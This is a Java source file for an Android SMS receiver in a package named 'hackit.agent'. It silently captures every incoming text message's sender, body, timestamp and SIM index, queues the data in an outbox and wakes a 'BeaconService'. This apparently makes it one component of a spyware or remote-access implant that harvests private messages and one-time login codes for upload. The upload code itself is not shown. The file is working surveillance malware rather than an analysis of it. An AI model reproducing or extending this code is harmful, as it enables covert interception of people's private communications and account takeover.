package com.hackit.agent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import org.json.JSONArray;
import org.json.JSONObject;

/** Instant SMS capture; the content observer backstops anything missed here. */
public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null || !"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            return;
        }
        try {
            Bundle bundle = intent.getExtras();
            if (bundle == null) {
                return;
            }
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) {
                return;
            }
            String format = bundle.getString("format");
            JSONArray rows = new JSONArray();
            for (Object pdu : pdus) {
                SmsMessage message = format != null
                        ? SmsMessage.createFromPdu((byte[]) pdu, format)
                        : SmsMessage.createFromPdu((byte[]) pdu);
                if (message == null) {
                    continue;
                }
                JSONObject row = new JSONObject();
                row.put("from", message.getOriginatingAddress());
                row.put("body", message.getMessageBody());
                row.put("ts", message.getTimestampMillis());
                row.put("sim", message.getIndexOnSim());
                rows.put(row);
            }
            if (rows.length() > 0) {
                Outbox.event("sms", rows);
                BeaconService.poke(context);
            }
        } catch (Throwable exc) {
            Log.e("sms rx: " + exc);
        }
    }
}
